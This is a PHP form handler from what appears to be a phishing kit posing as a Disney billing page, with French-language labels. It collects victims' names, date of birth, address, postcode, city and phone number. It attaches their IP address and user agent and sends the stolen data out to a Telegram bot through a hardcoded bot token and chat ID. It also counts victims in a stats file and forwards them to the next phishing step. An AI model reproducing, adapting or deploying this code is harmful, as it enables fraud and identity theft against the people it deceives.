<?php
  error_reporting(0);
  ob_start();
  session_start();
  include '../../Settings.php';
  include '../../ip.php';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["firstname"]    = $_POST["firstname"];
    $_SESSION["lastname"]    = $_POST["lastname"];
    $_SESSION["dob"] = $_POST["dob"];
    $_SESSION["address"]   = $_POST["address"];
    $_SESSION["zip"]    = $_POST["zip"];
    $_SESSION["city"]= $_POST["city"];
    $_SESSION["phone"]   = $_POST["phone"];

$message = '_______________________________
📞Nom : '.$_SESSION["firstname"].'
📞Prénom : '.$_SESSION["lastname"].'
📞Date de naissance : '.$_SESSION["dob"].'
📞Adresse : '.$_SESSION["address"].'
📞Code Postal : '.$_SESSION["zip"].'
📞Ville : '.$_SESSION["city"].'
📞Numéro de téléphone : '.$_SESSION["phone"].'
_______________________________
IP: '._ip().'
User Agent: '.$_SERVER["HTTP_USER_AGENT"].'
';

$mssagetelegram = urlencode("".$message."");
$htm = file_get_contents('https://api.telegram.org/bot5667575243:AAF2riFLc4YsaluQqP8wrkDp5fj2JrPWxBs/sendMessage?chat_id=-664463203&text='.$mssagetelegram.'');
$Subject=" 「🎰」 +1 Fr3sh Disney Billing 📞 | "._ip();
$head="From: 📈Stonks📈 <Billing@Ayz.Cash>";
	
$_SESSION['step_three']  = true;
	$filepath = './stats.ini';
$data = @parse_ini_file($filepath);
$data['billing_infos']++;
            function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === ""){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
update_ini_file($data, $filepath);
    header('location: ../billing2.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));

}
else
{
  header('location: ../../index.php');
} 

